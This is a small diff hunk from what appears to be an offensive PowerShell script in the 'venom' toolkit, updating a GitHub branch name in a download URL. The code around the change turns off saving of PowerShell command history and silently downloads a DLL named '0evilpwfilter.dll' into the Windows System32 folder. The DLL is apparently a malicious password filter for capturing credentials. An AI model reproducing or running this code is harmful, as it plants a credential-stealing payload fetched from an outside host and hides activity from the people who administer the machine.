@@ -136,7 +136,7 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
                 ## Download 0evilpwfilter.dll from my GitHub repository
                 If(-not(Test-Path -Path "$VulnDll")){## Check if auxiliary exists
-                    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
+                    Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/main/bin/0evilpwfilter.dll -Destination $Env:WINDIR\System32\0evilpwfilter.dll -ErrorAction SilentlyContinue|Out-Null
                 }
 
                 ## Make sure the downloaded DLL its not corrupted
